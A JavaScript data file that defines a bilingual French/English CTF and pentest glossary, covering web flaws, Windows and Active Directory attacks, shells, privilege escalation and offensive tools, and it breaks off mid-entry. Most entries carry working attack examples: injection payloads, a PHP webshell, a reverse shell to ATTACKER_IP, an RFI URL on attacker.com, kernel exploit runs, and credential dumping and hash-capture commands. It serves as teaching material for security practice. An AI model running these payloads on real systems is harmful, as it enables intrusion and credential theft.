// ─── Glossaire CTF/Pentest ────────────────────────────────────────────────────

const GLOSSARY = [
  // ── Vulnérabilités Web ──────────────────────────────────────────────────────
  {
    id: "sqli", name: "SQLi", fullName: "SQL Injection", category: "web",
    aliases: ["SQL Injection", "injection SQL", "sqlmap"],
    definition: "Injection de code SQL dans un paramètre non filtré pour manipuler la base de données : lire des données, bypasser l'authentification, écrire des fichiers ou exécuter des commandes.",
    definition_en: "Injection of SQL code into an unfiltered parameter to manipulate the database: read data, bypass authentication, write files, or execute commands.",
    example: "' OR 1=1-- \n' UNION SELECT 1,user(),database()--",
    tools: ["sqlmap", "Burp Suite"],
    refs: ["PayloadsAllTheThings - SQL Injection", "PortSwigger SQL Injection"]
  },
  {
    id: "xss", name: "XSS", fullName: "Cross-Site Scripting", category: "web",
    aliases: ["Cross-Site Scripting", "XSS"],
    definition: "Injection de JavaScript malveillant dans une page web. Reflected XSS = dans la réponse immédiate. Stored XSS = persisté en base. DOM XSS = manipulation du DOM côté client.",
    definition_en: "Injection of malicious JavaScript into a web page. Reflected XSS = in the immediate response. Stored XSS = persisted in the database. DOM XSS = client-side DOM manipulation.",
    example: "<script>alert(1)</script>\n<img src=x onerror=alert(1)>",
    tools: ["XSSHunter", "Burp Suite"],
    refs: ["PortSwigger XSS"]
  },
  {
    id: "lfi", name: "LFI", fullName: "Local File Inclusion", category: "web",
    aliases: ["Local File Inclusion", "path traversal", "traversal"],
    definition: "Le serveur inclut un fichier local en se basant sur un paramètre contrôlé par l'utilisateur. Permet de lire des fichiers sensibles (/etc/passwd, clés SSH, configs) et parfois d'obtenir un RCE via log poisoning.",
    definition_en: "The server includes a local file based on a user-controlled parameter. Allows reading sensitive files (/etc/passwd, SSH keys, configs) and sometimes achieving RCE via log poisoning.",
    example: "?page=../../../../etc/passwd\n?file=php://filter/convert.base64-encode/resource=config.php",
    tools: ["Burp Suite", "curl"],
    refs: ["HackTricks LFI"]
  },
  {
    id: "rfi", name: "RFI", fullName: "Remote File Inclusion", category: "web",
    aliases: ["Remote File Inclusion"],
    definition: "Comme LFI mais inclut une URL distante. Rare car require allow_url_include=On en PHP. Permet un RCE direct en hébergeant un webshell sur son propre serveur.",
    definition_en: "Like LFI but includes a remote URL. Rare because it requires allow_url_include=On in PHP. Allows direct RCE by hosting a webshell on your own server.",
    example: "?page=http://attacker.com/shell.php",
    tools: ["curl", "python3 -m http.server"],
    refs: ["HackTricks RFI"]
  },
  {
    id: "rce", name: "RCE", fullName: "Remote Code Execution", category: "exploit",
    aliases: ["Remote Code Execution", "exécution de code", "code execution", "command execution"],
    definition: "Capacité à exécuter des commandes arbitraires sur le serveur cible. C'est l'objectif principal de nombreuses vulnérabilités web. Mène directement à un reverse shell.",
    definition_en: "The ability to execute arbitrary commands on the target server. This is the primary goal of many web vulnerabilities. Leads directly to a reverse shell.",
    example: "<?php system($_GET['cmd']); ?>",
    tools: ["Burp Suite", "msfvenom", "netcat"],
    refs: ["revshells.com"]
  },
  {
    id: "ssti", name: "SSTI", fullName: "Server-Side Template Injection", category: "web",
    aliases: ["Server-Side Template Injection", "template injection", "Jinja2", "Twig"],
    definition: "Injection dans un moteur de templates côté serveur. Si l'input est rendu par Jinja2/Twig/ERB sans sanitisation, il est évalué comme code → RCE.",
    definition_en: "Injection into a server-side template engine. If input is rendered by Jinja2/Twig/ERB without sanitization, it is evaluated as code → RCE.",
    example: "{{7*7}} → 49 = Jinja2 ou Twig confirmé\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    example_en: "{{7*7}} → 49 = Jinja2 or Twig confirmed\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    tools: ["Burp Suite", "tplmap"],
    refs: ["HackTricks SSTI", "PayloadsAllTheThings SSTI"]
  },
  {
    id: "ssrf", name: "SSRF", fullName: "Server-Side Request Forgery", category: "web",
    aliases: ["Server-Side Request Forgery"],
    definition: "Forcer le serveur à faire des requêtes HTTP vers des ressources internes (metadata cloud, services internes non exposés, fichiers locaux via file://). Souvent utilisé pour accéder aux métadonnées AWS/GCP (169.254.169.254).",
    definition_en: "Force the server to make HTTP requests to internal resources (cloud metadata, unexposed internal services, local files via file://). Often used to access AWS/GCP metadata (169.254.169.254).",
    example: "url=http://169.254.169.254/latest/meta-data/\nurl=file:///etc/passwd",
    tools: ["Burp Suite Collaborator", "curl"],
    refs: ["PortSwigger SSRF", "HackTricks SSRF"]
  },
  {
    id: "xxe", name: "XXE", fullName: "XML External Entity", category: "web",
    aliases: ["XML External Entity", "XML injection"],
    definition: "Injection d'entités XML externes pour lire des fichiers locaux, effectuer du SSRF ou exécuter des requêtes réseau. Fonctionne si le parser XML n'est pas correctement configuré.",
    definition_en: "Injection of external XML entities to read local files, perform SSRF, or execute network requests. Works if the XML parser is not properly configured.",
    example: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>",
    tools: ["Burp Suite"],
    refs: ["PortSwigger XXE"]
  },
  {
    id: "idor", name: "IDOR", fullName: "Insecure Direct Object Reference", category: "web",
    aliases: ["Insecure Direct Object Reference", "IDOR"],
    definition: "Manipulation d'un identifiant dans une URL ou un paramètre pour accéder à des ressources appartenant à d'autres utilisateurs. Aucune vérification d'autorisation côté serveur.",
    definition_en: "Manipulation of an identifier in a URL or parameter to access resources belonging to other users. No server-side authorization check is performed.",
    example: "/api/user/1 → /api/user/2\n/download?file=invoice_1.pdf → invoice_2.pdf",
    tools: ["Burp Suite Intruder"],
    refs: ["PortSwigger IDOR"]
  },
  {
    id: "cmd_injection", name: "CMDi", fullName: "Command Injection", category: "web",
    aliases: ["Command Injection", "OS injection", "command injection"],
    definition: "L'application passe des données utilisateur à un shell système sans sanitisation. Les séparateurs ; && || | permettent d'injecter des commandes supplémentaires.",
    definition_en: "The application passes user data to a system shell without sanitization. Separators such as ; && || | allow injecting additional commands.",
    example: "127.0.0.1; id\n127.0.0.1 && cat /etc/passwd",
    tools: ["Burp Suite", "curl"],
    refs: ["HackTricks Command Injection"]
  },
  {
    id: "jwt", name: "JWT", fullName: "JSON Web Token", category: "web",
    aliases: ["JSON Web Token", "JWT"],
    definition: "Token d'authentification en 3 parties base64 : header.payload.signature. Vulnérabilités : algorithme 'none', clé secrète faible (brute force), confusion RS256→HS256.",
    definition_en: "Authentication token in 3 base64 parts: header.payload.signature. Vulnerabilities: 'none' algorithm, weak secret key (brute force), RS256→HS256 algorithm confusion.",
    example: "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    tools: ["jwt.io", "jwt_tool", "hashcat -m 16500"],
    refs: ["PortSwigger JWT attacks"]
  },
  {
    id: "csrf", name: "CSRF", fullName: "Cross-Site Request Forgery", category: "web",
    aliases: ["Cross-Site Request Forgery", "CSRF"],
    definition: "Forcer le navigateur d'une victime authentifiée à effectuer des requêtes non voulues. Exploite la confiance du serveur envers le navigateur. Contré par les tokens CSRF.",
    definition_en: "Force an authenticated victim's browser to perform unwanted requests. Exploits the server's trust in the browser. Mitigated by CSRF tokens.",
    example: "<img src='http://bank.com/transfer?to=attacker&amount=1000'>",
    tools: ["Burp Suite"],
    refs: ["PortSwigger CSRF"]
  },

  // ── Réseau / Services ───────────────────────────────────────────────────────
  {
    id: "smb", name: "SMB", fullName: "Server Message Block", category: "network",
    aliases: ["Server Message Block", "SMB", "Samba"],
    definition: "Protocole Windows de partage de fichiers et d'imprimantes. Port 445. Null session = accès sans credentials. Cible de EternalBlue (MS17-010).",
    definition_en: "Windows protocol for file and printer sharing. Port 445. Null session = access without credentials. Target of EternalBlue (MS17-010).",
    example: "smbclient -L //TARGET -N\nenum4linux -a TARGET",
    tools: ["smbclient", "enum4linux", "crackmapexec", "smbmap"],
    refs: ["HackTricks SMB"]
  },
  {
    id: "ntlm", name: "NTLM", fullName: "NT LAN Manager", category: "network",
    aliases: ["NT LAN Manager", "NTLM", "NTLMv2", "NTLMv1"],
    definition: "Protocole d'authentification Windows utilisant des hashes. NTLMv1/v2 peuvent être capturés avec Responder et crackés ou utilisés directement en pass-the-hash.",
    definition_en: "Windows authentication protocol using hashes. NTLMv1/v2 can be captured with Responder and cracked, or used directly in pass-the-hash attacks.",
    example: "Capturer : sudo responder -I tun0\nCracker : hashcat -m 5600 hash.txt rockyou.txt\nPTH : impacket-psexec -hashes :HASH user@TARGET",
    example_en: "Capture: sudo responder -I tun0\nCrack: hashcat -m 5600 hash.txt rockyou.txt\nPTH: impacket-psexec -hashes :HASH user@TARGET",
    tools: ["Responder", "hashcat", "impacket", "crackmapexec"],
    refs: ["HackTricks NTLM"]
  },
  {
    id: "pass_hash", name: "Pass-the-Hash", fullName: "Pass-the-Hash (PtH)", category: "network",
    aliases: ["Pass-the-Hash", "PtH", "pass the hash"],
    definition: "Utiliser directement le hash NTLM d'un utilisateur pour s'authentifier sans connaître le mot de passe en clair. Fonctionne sur SMB, WinRM, RDP selon la config.",
    definition_en: "Use a user's NTLM hash directly to authenticate without knowing the plaintext password. Works over SMB, WinRM, and RDP depending on the configuration.",
    example: "impacket-psexec -hashes :NTLM_HASH admin@TARGET\nevil-winrm -i TARGET -u admin -H NTLM_HASH",
    tools: ["impacket", "evil-winrm", "crackmapexec"],
    refs: ["HackTricks Pass the Hash"]
  },
  {
    id: "kerberos", name: "Kerberoasting", fullName: "Kerberoasting", category: "network",
    aliases: ["Kerberoasting", "Kerberos", "TGS", "TGT", "AS-REP"],
    definition: "Attaque Active Directory : demander des tickets TGS pour des comptes service, puis cracker leurs hashes offline. AS-REP Roasting = similaire mais pour comptes sans pre-auth Kerberos.",
    definition_en: "Active Directory attack: request TGS tickets for service accounts, then crack their hashes offline. AS-REP Roasting = similar but targets accounts without Kerberos pre-authentication.",
    example: "impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER\nhashcat -m 13100 hash.txt rockyou.txt",
    tools: ["impacket-GetUserSPNs", "Rubeus", "hashcat"],
    refs: ["HackTricks Kerberoasting"]
  },

  // ── Shells ──────────────────────────────────────────────────────────────────
  {
    id: "reverse_shell", name: "Reverse Shell", fullName: "Reverse Shell", category: "exploit",
    aliases: ["Reverse Shell", "reverse shell", "revshell"],
    definition: "La machine cible initie la connexion vers l'attaquant. L'attaquant écoute avec netcat. Contourne les firewalls entrants car la connexion sort de la cible.",
    definition_en: "The target machine initiates the connection to the attacker. The attacker listens with netcat. Bypasses inbound firewalls because the connection originates from the target.",
    example: "Attaquant : nc -lvnp 4444\nCible : bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
    example_en: "Attacker: nc -lvnp 4444\nTarget: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
    tools: ["netcat", "rlwrap", "msfvenom"],
    refs: ["revshells.com"]
  },
  {
    id: "webshell", name: "Webshell", fullName: "Webshell", category: "exploit",
    aliases: ["Webshell", "web shell", "shell.php"],
    definition: "Script (PHP, ASP, JSP) uploadé sur le serveur web permettant d'exécuter des commandes via HTTP. Point d'entrée pour obtenir un reverse shell.",
    definition_en: "A script (PHP, ASP, JSP) uploaded to the web server that allows executing commands via HTTP. Entry point for obtaining a reverse shell.",
    example: "<?php system($_GET['cmd']); ?>\n# Accès : /uploads/shell.php?cmd=id",
    example_en: "<?php system($_GET['cmd']); ?>\n# Access: /uploads/shell.php?cmd=id",
    tools: ["weevely", "php-reverse-shell"],
    refs: ["HackTricks Web Shells"]
  },
  {
    id: "bind_shell", name: "Bind Shell", fullName: "Bind Shell", category: "exploit",
    aliases: ["Bind Shell", "bind shell"],
    definition: "La machine cible ouvre un port en écoute et attend que l'attaquant se connecte. Moins courant qu'un reverse shell car les firewalls entrants bloquent souvent ces connexions. Utile quand la cible ne peut pas initier de connexion sortante (DMZ stricte, règles egress).",
    definition_en: "The target machine opens a listening port and waits for the attacker to connect. Less common than a reverse shell because inbound firewalls often block these connections. Useful when the target cannot initiate outbound connections (strict DMZ, egress rules).",
    example: "# Sur la cible :\nnc -lvnp 4444 -e /bin/bash\n# Sur l'attaquant :\nnc TARGET_IP 4444\n# Via msfvenom :\nmsfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf",
    example_en: "# On target:\nnc -lvnp 4444 -e /bin/bash\n# On attacker:\nnc TARGET_IP 4444\n# Via msfvenom:\nmsfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf",
    tools: ["netcat", "msfvenom"],
    refs: []
  },

  // ── PrivEsc Linux ───────────────────────────────────────────────────────────
  {
    id: "suid", name: "SUID", fullName: "Set User ID (SUID)", category: "privesc",
    aliases: ["SUID", "Set User ID", "setuid", "s bit"],
    definition: "Bit de permission spécial Linux. Un binaire avec SUID s'exécute avec les droits de son propriétaire (souvent root) plutôt que ceux de l'utilisateur courant. GTFOBins liste les binaires exploitables.",
    definition_en: "Special Linux permission bit. A binary with SUID runs with the privileges of its owner (often root) rather than the current user. GTFOBins lists exploitable binaries.",
    example: "find / -perm -u=s -type f 2>/dev/null\n# Ex: /usr/bin/find → sudo find . -exec /bin/sh \\; -quit",
    example_en: "find / -perm -u=s -type f 2>/dev/null\n# e.g.: /usr/bin/find → sudo find . -exec /bin/sh \\; -quit",
    tools: ["LinPEAS", "GTFOBins"],
    refs: ["GTFOBins.github.io", "HackTricks SUID"]
  },
  {
    id: "gtfobins", name: "GTFOBins", fullName: "GTFOBins", category: "privesc",
    aliases: ["GTFOBins", "gtfo"],
    definition: "Site référence listant les binaires Unix pouvant être utilisés pour contourner les restrictions de sécurité : escalade de privilèges via SUID, sudo, capabilities, cron.",
    definition_en: "Reference website listing Unix binaries that can be used to bypass security restrictions: privilege escalation via SUID, sudo, capabilities, and cron.",
    example: "gtfobins.github.io\n# Chercher le binaire → section SUID / Sudo",
    example_en: "gtfobins.github.io\n# Find the binary → SUID / Sudo section",
    tools: [],
    refs: ["gtfobins.github.io"]
  },
  {
    id: "sudo", name: "sudo", fullName: "sudo (Superuser Do)", category: "privesc",
    aliases: ["sudo -l", "sudoers", "NOPASSWD"],
    definition: "Commande permettant d'exécuter des programmes en tant qu'un autre utilisateur (souvent root). 'sudo -l' liste les commandes autorisées. NOPASSWD = sans mot de passe. Chaque binaire autorisé peut être un vecteur d'escalade.",
    definition_en: "Command that allows running programs as another user (usually root). 'sudo -l' lists allowed commands. NOPASSWD = no password required. Each allowed binary can be an escalation vector.",
    example: "sudo -l\n# Si (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c ':!/bin/bash'",
    example_en: "sudo -l\n# If (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c ':!/bin/bash'",
    tools: ["GTFOBins"],
    refs: ["GTFOBins.github.io - sudo"]
  },
  {
    id: "capabilities", name: "Capabilities", fullName: "Linux Capabilities", category: "privesc",
    aliases: ["Capabilities", "capabilities", "cap_setuid", "getcap"],
    definition: "Mécanisme Linux donnant des privilèges spécifiques à des binaires sans SUID complet. cap_setuid = changer l'UID → root. cap_net_raw = accès raw sockets. cap_dac_override = ignorer permissions fichiers.",
    definition_en: "Linux mechanism granting specific privileges to binaries without full SUID. cap_setuid = change UID → root. cap_net_raw = raw socket access. cap_dac_override = bypass file permissions.",
    example: "getcap -r / 2>/dev/null\n# python3 avec cap_setuid+ep :\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    example_en: "getcap -r / 2>/dev/null\n# python3 with cap_setuid+ep:\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    tools: ["LinPEAS"],
    refs: ["GTFOBins - Capabilities", "HackTricks Capabilities"]
  },
  {
    id: "cron", name: "Cron", fullName: "Cron Jobs", category: "privesc",
    aliases: ["Cron", "cron job", "crontab", "cronjob", "pspy"],
    definition: "Planificateur de tâches Linux. Si un script exécuté périodiquement en root est modifiable, on peut y injecter des commandes. pspy révèle les crons sans droits root.",
    definition_en: "Linux task scheduler. If a script periodically executed as root is writable, commands can be injected into it. pspy reveals cron jobs without root privileges.",
    example: "crontab -l && cat /etc/crontab\nwget http://IP/pspy64 && chmod +x pspy64 && ./pspy64",
    tools: ["pspy", "LinPEAS"],
    refs: ["HackTricks Cron Jobs"]
  },
  {
    id: "path_hijack", name: "PATH Hijacking", fullName: "PATH Hijacking", category: "privesc",
    aliases: ["PATH Hijacking", "path hijacking", "PATH"],
    definition: "Si un binaire SUID/sudo appelle d'autres commandes sans chemin absolu, on peut placer un faux exécutable au début du PATH pour l'intercepter.",
    definition_en: "If a SUID/sudo binary calls other commands without an absolute path, a fake executable can be placed at the beginning of the PATH to intercept it.",
    example: "# SUID appelle 'service' sans chemin absolu\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service && chmod +x /tmp/service",
    example_en: "# SUID calls 'service' without absolute path\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service && chmod +x /tmp/service",
    tools: ["strings (pour détecter les appels relatifs)"],
    refs: ["HackTricks PATH Injection"]
  },
  {
    id: "docker_escape", name: "Docker Escape", fullName: "Docker Group Escape", category: "privesc",
    aliases: ["Docker", "docker escape", "docker group", "lxd", "lxc"],
    definition: "Appartenir au groupe docker donne un accès root effectif à l'hôte. En montant / dans un conteneur, on accède au système hôte complet.",
    definition_en: "Being in the docker group grants effective root access to the host. By mounting / inside a container, the full host system becomes accessible.",
    example: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    tools: ["docker"],
    refs: ["HackTricks Docker Breakout"]
  },
  {
    id: "dirtycow", name: "DirtyCow", fullName: "DirtyCow (CVE-2016-5195)", category: "privesc",
    aliases: ["DirtyCow", "Dirty COW", "CVE-2016-5195"],
    definition: "Race condition dans le mécanisme copy-on-write (COW) du kernel Linux pour les versions < 4.8.3 (toutes distros). Permet à un utilisateur non-privilégié d'écrire dans des fichiers mappés en mémoire qui sont normalement en lecture seule. Exploitation classique : modifier /etc/passwd pour ajouter un utilisateur root ou remplacer un binaire SUID. Instable sur certains kernels (peut kernel panic). Vérifier la version avec 'uname -r' avant d'exploiter.",
    definition_en: "Race condition in the copy-on-write (COW) mechanism of the Linux kernel (< 4.8.3, all distros). Allows an unprivileged user to write to memory-mapped files that are normally read-only. Classic exploit: modify /etc/passwd to add a root user, or replace a SUID binary. Unstable on some kernels (may cause kernel panic). Check version with 'uname -r' before exploiting.",
    example: "uname -r  # vérifier version kernel\ngcc -pthread dirty.c -o dirty -lcrypt && ./dirty PASSWORD\n# Ou variante : écraser un binaire SUID\ngcc -pthread dirtyc0w.c -o dirtyc0w && ./dirtyc0w /usr/bin/passwd payload",
    example_en: "uname -r  # check kernel version\ngcc -pthread dirty.c -o dirty -lcrypt && ./dirty PASSWORD\n# Or variant: overwrite a SUID binary\ngcc -pthread dirtyc0w.c -o dirtyc0w && ./dirtyc0w /usr/bin/passwd payload",
    tools: [],
    refs: ["exploit-db 40839", "CVE-2016-5195"]
  },
  {
    id: "dirtypipe", name: "DirtyPipe", fullName: "DirtyPipe (CVE-2022-0847)", category: "privesc",
    aliases: ["DirtyPipe", "Dirty Pipe", "CVE-2022-0847"],
    definition: "Vulnérabilité dans le kernel Linux (5.8 ≤ version < 5.16.11 / 5.15.25 / 5.10.102) permettant d'écrire dans des pages de cache de fichiers en lecture seule via le mécanisme pipe. Plus fiable et stable que DirtyCow. Exploitation : écraser un binaire SUID (ex : /usr/bin/passwd) avec un payload, obtenir un shell root, puis restaurer le binaire original. Peut aussi modifier des fichiers de config.",
    definition_en: "Linux kernel vulnerability (5.8 ≤ version < 5.16.11 / 5.15.25 / 5.10.102) allowing writes to read-only file cache pages via the pipe mechanism. More reliable and stable than DirtyCow. Exploit: overwrite a SUID binary (e.g. /usr/bin/passwd) with a payload, get a root shell, then restore the original binary.",
    example: "uname -r  # vérifier 5.8 ≤ version < 5.16.11\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe /usr/bin/passwd  # shell root\n# Ou : ./dirtypipe /etc/passwd (ajouter entrée root)",
    example_en: "uname -r  # check 5.8 ≤ version < 5.16.11\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe /usr/bin/passwd  # root shell\n# Or: ./dirtypipe /etc/passwd (add root entry)",
    tools: [],
    refs: ["CVE-2022-0847", "github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"]
  },
  {
    id: "linpeas", name: "LinPEAS", fullName: "Linux Privilege Escalation Awesome Script", category: "privesc",
    aliases: ["LinPEAS", "linpeas.sh"],
    definition: "Script bash automatisant la recherche de vecteurs d'escalade de privilèges Linux. Colore en rouge/jaune les éléments critiques. À télécharger depuis github.com/carlospolop/PEASS-ng.",
    definition_en: "Bash script that automates the search for Linux privilege escalation vectors. Colors critical findings in red/yellow. Download from github.com/carlospolop/PEASS-ng.",
    example: "curl http://YOUR_IP:8000/linpeas.sh | bash",
    tools: [],
    refs: ["github.com/carlospolop/PEASS-ng"]
  },

  // ── PrivEsc Windows ─────────────────────────────────────────────────────────
  {
    id: "seimpersonate", name: "SeImpersonatePrivilege", fullName: "SeImpersonatePrivilege", category: "privesc",
    aliases: ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "Impersonate", "Potato"],
    definition: "Privilège Windows permettant d'usurper des tokens d'authentification. Présent sur IIS, MSSQL, services réseau. Exploitable avec Potato exploits (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato) pour obtenir SYSTEM.",
    definition_en: "Windows privilege allowing impersonation of authentication tokens. Present on IIS, MSSQL, and network services. Exploitable with Potato exploits (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato) to obtain SYSTEM.",
    example: "whoami /priv | findstr SeImpersonate\nPrintSpoofer.exe -i -c cmd\nGodPotato -cmd 'cmd /c whoami'",
    tools: ["PrintSpoofer", "GodPotato", "JuicyPotato", "RoguePotato"],
    refs: ["HackTricks SeImpersonatePrivilege"]
  },
  {
    id: "winpeas", name: "WinPEAS", fullName: "Windows Privilege Escalation Awesome Script", category: "privesc",
    aliases: ["WinPEAS", "winpeas.exe"],
    definition: "Équivalent Windows de LinPEAS. Énumère automatiquement tous les vecteurs d'escalade : services, registre, credentials, tokens, etc.",
    definition_en: "Windows equivalent of LinPEAS. Automatically enumerates all escalation vectors: services, registry, credentials, tokens, etc.",
    example: "curl http://YOUR_IP:8000/winPEASx64.exe -o wp.exe && wp.exe",
    tools: [],
    refs: ["github.com/carlospolop/PEASS-ng"]
  },
  {
    id: "mimikatz", name: "Mimikatz", fullName: "Mimikatz", category: "privesc",
    aliases: ["Mimikatz", "mimikatz", "sekurlsa", "lsadump"],
    definition: "Outil Windows d'extraction de credentials depuis la mémoire (lsass). Peut dumper mots de passe en clair, hashes NTLM, tickets Kerberos.",
    definition_en: "Windows tool for extracting credentials from memory (lsass). Can dump plaintext passwords, NTLM hashes, and Kerberos tickets.",
    example: "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam",
    tools: [],
    refs: ["github.com/gentilkiwi/mimikatz"]
  },
  {
    id: "uac", name: "UAC", fullName: "User Account Control", category: "privesc",
    aliases: ["UAC", "User Account Control"],
    definition: "Mécanisme Windows demandant confirmation pour les actions nécessitant des droits admin. Des techniques de bypass UAC existent (fodhelper, sdclt, eventvwr) pour passer en High Integrity sans popup.",
    definition_en: "Windows mechanism that prompts for confirmation on actions requiring admin rights. UAC bypass techniques exist (fodhelper, sdclt, eventvwr) to elevate to High Integrity without a popup.",
    example: "# Vérifier le niveau UAC :\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
    example_en: "# Check UAC level:\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
    tools: ["UACMe", "msfconsole bypassuac"],
    refs: ["HackTricks UAC Bypass"]
  },

  // ── Outils ──────────────────────────────────────────────────────────────────
  {
    id: "nmap", name: "Nmap", fullName: "Nmap (Network Mapper)", category: "tool",
    aliases: ["Nmap", "nmap"],
    definition: "Scanner réseau incontournable. Détecte les ports ouverts, services, versions et OS. Les scripts NSE permettent des tests de vulnérabilités automatiques.",
    definition_en: "Essential network scanner. Detects open ports, services, versions, and OS. NSE scripts enable automated vulnerability testing.",
    example: "nmap -sV -sC -p- --min-rate 5000 -oA scan TARGET\nnmap -p 445 --script smb-vuln-ms17-010 TARGET",
    tools: [],
    refs: ["nmap.org"]
  },
  {
    id: "gobuster", name: "Gobuster", fullName: "Gobuster / Feroxbuster / ffuf", category: "tool",
    aliases: ["Gobuster", "gobuster", "feroxbuster", "ffuf", "dirbuster", "dirb"],
    definition: "Outils de fuzzing web. Énumèrent les répertoires et fichiers cachés par bruteforce de wordlists. Feroxbuster = récursif. ffuf = le plus flexible (headers, POST, vhosts).",
    definition_en: "Web fuzzing tools. Enumerate hidden directories and files by brute-forcing wordlists. Feroxbuster = recursive. ffuf = most flexible (headers, POST, vhosts).",
    example: "feroxbuster -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\nffuf -w wordlist.txt -u http://TARGET/FUZZ",
    tools: [],
    refs: ["github.com/OJ/gobuster", "github.com/epi052/feroxbuster"]
  },
  {
    id: "sqlmap", name: "SQLmap", fullName: "SQLmap", category: "tool",
    aliases: ["SQLmap", "sqlmap"],
    definition: "Outil automatique de détection et d'exploitation des injections SQL. Supporte tous les types d'injection (boolean, time-based, union, error). Peut dumper des bases entières et tenter un shell OS.",
    definition_en: "Automatic tool for detecting and exploiting SQL injections. Supports all injection types (boolean, time-based, union, error). Can dump entire databases and attempt an OS shell.",
    example: "sqlmap -u 'http://TARGET/page.php?id=1' --dbs --batch\nsqlmap -r request.txt --os-shell --batch",
    tools: [],
    refs: ["sqlmap.org"]
  },
  {
    id: "hydra", name: "Hydra", fullName: "Hydra (THC-Hydra)", category: "tool",
    aliases: ["Hydra", "hydra", "medusa", "brute force"],
    definition: "Outil de brute force multi-protocoles. Supporte SSH, HTTP, FTP, SMB, RDP, MySQL, etc. Medusa est une alternative.",
    definition_en: "Multi-protocol brute force tool. Supports SSH, HTTP, FTP, SMB, RDP, MySQL, etc. Medusa is an alternative.",
    example: "hydra -l admin -P rockyou.txt ssh://TARGET\nhydra -l admin -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Wrong'",
    tools: [],
    refs: []
  },
  {
    id: "metasploit", name: "Metasploit", fullName: "Metasploit Framework", category: "tool",
    aliases: ["Metasploit", "metasploit", "msfconsole", "meterpreter", "msfvenom"],
    definition: "Framework d'exploitation. msfconsole = interface principale. msfvenom = génération de payloads. Meterpreter = payload avancé avec migration, screenshot, pivoting, etc.",
    definition_en: "Exploitation framework. msfconsole = main interface. msfvenom = payload generation. Meterpreter = advanced payload with migration, screenshot, pivoting, etc.",
    example: "msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS TARGET && set LHOST YOUR_IP\nrun",
    tools: [],
    refs: ["metasploit.com"]
  },
  {
    id: "searchsploit", name: "Searchsploit", fullName: "Searchsploit (ExploitDB)", category: "tool",
    aliases: ["Searchsploit", "searchsploit", "exploitdb", "exploit-db"],
    definition: "Outil CLI pour chercher dans la base de données exploit-db.com des exploits localement. searchsploit -m pour copier l'exploit dans le répertoire courant.",
    definition_en: "CLI tool for searching exploit-db.com's exploit database locally. Use searchsploit -m to copy the exploit into the current directory.",
    example: "searchsploit apache 2.4.49\nsearchsploit -m 50383\npython3 50383.py http://TARGET",
    tools: [],
    refs: ["exploit-db.com"]
  },
  {
    id: "burp", name: "Burp Suite", fullName: "Burp Suite", category: "tool",
    aliases: ["Burp Suite", "Burp", "burpsuite", "burp suite"],
    definition: "Proxy d'interception HTTP indispensable. Permet d'intercepter/modifier des requêtes, fuzzer (Intruder), scanner (Scanner), rejouer (Repeater), et décoder des données.",
    definition_en: "Essential HTTP interception proxy. Allows intercepting/modifying requests, fuzzing (Intruder), scanning (Scanner), replaying (Repeater), and decoding data.",
    example: "Configurer proxy navigateur : 127.0.0.1:8080\nProxy > Intercept > Forward/Drop\nRepeater : modifier et rejouer requêtes",
    example_en: "Configure browser proxy: 127.0.0.1:8080\nProxy > Intercept > Forward/Drop\nRepeater: modify and replay requests",
    tools: [],
    refs: ["portswigger.net/burp"]
  },
  {
    id: "responder", name: "Responder", fullName: "Responder", category: "tool",
    aliases: ["Responder", "responder"],
    definition: "Outil qui répond aux requêtes LLMNR, NBT-NS et mDNS pour capturer des hashes NTLM. Très efficace en réseau interne pour capturer des credentials Windows.",
    definition_en: "Tool that responds to LLMNR, NBT-NS, and mDNS requests to capture NTLM hashes. Very effective on internal networks for capturing Windows credentials.",
    example: "sudo responder -I tun0 -dwPv\n# Puis cracker : hashcat -m 5600 hash.txt rockyou.txt",
    example_en: "sudo responder -I tun0 -dwPv\n# Then crack: hashcat -m 5600 hash.txt rockyou.txt",
    tools: [],
    refs: ["github.com/lgandx/Responder"]
  },
  {
    id: "hashcat", name: "Hashcat", fullName: "Hashcat / John the Ripper", category: "tool",
    aliases: ["Hashcat", "hashcat", "john", "John the Ripper"],
    definition: "Outils de crackage de hashes. Hashcat utilise le GPU (plus rapide). John = CPU. Modes hashcat : 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 5600=NTLMv2.",
    definition_en: "Hash cracking tools. Hashcat uses the GPU (faster). John uses the CPU. Hashcat modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 5600=NTLMv2.",
    example: "hashcat -m 0 hash.txt rockyou.txt\njohn hash.txt --wordlist=rockyou.txt --format=Raw-MD5",
    tools: [],
    refs: ["hashcat.net"]
  },
  {
    id: "impacket", name: "Impacket", fullName: "Impacket (suite)", category: "tool",
